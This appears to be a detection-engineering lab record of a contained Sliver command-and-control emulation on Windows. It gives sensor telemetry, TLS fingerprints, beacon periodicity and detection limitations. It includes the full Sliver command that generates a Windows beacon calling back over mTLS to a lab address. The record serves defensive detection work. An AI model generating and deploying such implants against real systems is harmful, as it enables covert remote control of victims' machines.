scenario.name: Bounded mTLS C2 foothold, host survey, command execution, and small transfer
scenario.scope: Generate and run one Windows beacon, establish contained mTLS C2 only to Kali, perform bounded discovery and one benign shell task, and download one fixed non-host-data marker.

environment.topology: Contained vmbr1 attacker/target lab; implant C2 configured only for Kali 192.168.1.50

sensors.name: Sysmon
sensors.config_notes: Verification-grade process, network, DNS, file, registry, and deep Sysmon coverage

sensors.name: pktmon
sensors.configuration: All components, no filters, all packets, pkt-size 0, 512 MB circular ETL

implant.name: SLIVER-NSM
implant.c2_transport: Sliver mutually authenticated TLS over raw TCP
implant.generation_command: generate beacon --mtls 192.168.1.50:31337 --os windows --arch amd64 --format exe --name SLIVER-NSM --seconds 10 --jitter 3 --save /tmp/sliver-nsm/sliver-nsm.exe

automation.setup_result: RC console started mTLS job 1 and generated the implant; ss confirmed only the contained listener plus loopback multiplayer port.

deployment.method: Out-of-band Proxmox guest-agent transfer using lab-pull and Windows-capable lab-push
deployment.details: The 34,571,264-byte artifact exceeded one-shot guest-agent and host argument limits. It was pulled from Kali in bounded chunks, split into 1,056 32 KiB chunks, pushed with lab-push, and reassembled on Windows by PowerShell.
deployment.integrity: Kali, AI-VM reconstruction, and target SHA-256 all matched A0961CB4...24BD9C; no HTTP staging server was used.

not_observed_techniques.name: Application Layer Protocol: Web Protocols

network_and_dns.endpoint: Sysmon EID 3 attributed 18 initiated TCP connections to the implant; no implant EID 22 query occurred.
network_and_dns.nsm: Zeek and Suricata parsed 18 TLS 1.3 flows with JA3 2196848d251b217de8b2c037e356c11d and JA3S f4febc55ea12b31ae17cfb7e614afda8. No SNI, HTTP, hostname C2, or passively visible C2 x509 chain was present.
network_and_dns.jarm: Active NSM measurement returned all-zero JARM because generic probes could not complete client-authenticated mTLS.
network_and_dns.periodicity: After excluding the one-second startup pair, 16 Zeek flow-start gaps ranged 10.043–12.786 seconds (median 11.319, stdev 0.913), matching the configured 10-second interval plus up to 3 seconds jitter.
network_and_dns.suricata: No ET Open Sliver/content rule fired; only invalid-checksum decoder events caused by pktmon/checksum offload were present.

files.details: EID 11 recorded PowerShell writing the implant, Windows writing its Prefetch artifact, and implant-spawned cmd.exe writing the fixed marker. No related EID 23/26 delete occurred.

registry.details: No EID 12/13/14 event carried the implant ProcessGuid.

process_identity_and_command.details: EID 1 recorded the generated implant with absent PE identity metadata, its SHA-256, SYSTEM context, and PowerShell parent; the benign cmd.exe command line was also captured.

parent_child.status: observed process parent-child; no Tier 2 named pipes
parent_child.details: EID 1 recorded sliver-nsm.exe directly spawning cmd.exe. No EID 17/18 named-pipe event or implant-attributed EID 10 process-access event occurred.

evidence.description: Sanitized fields and counts for all five endpoint observation dimensions.
Sanitized Zeek, Suricata, JA3/JA3S, JARM, TLS, DNS, alert, and aggregate timing evidence.

detection_limitations: Generated names, hashes, ports, transport profiles, and TLS stacks are operator- or version-dependent; no rule hardcodes the lab address or port.
JA3/JA3S can overlap with other Go software and can change across Sliver/Go versions; use the pair plus periodicity and endpoint context.
Single-event Sigma cannot express the observed 10+0–3 second flow periodicity; an analytics layer must aggregate by endpoint pair and fingerprint.
TLS 1.3 mTLS exposed no passive certificate chain/x509 row in this trace, and JARM was all-zero because generic probes could not authenticate.
The broad no-SNI/no-visible-cert Zeek rule is intentionally a low-level hunt and requires aggregation/tuning.

sanitization.notes: Only detection-relevant endpoint fields, TLS fingerprints, JARM result, NSM versions, alert summaries, and aggregate flow metadata are committed.
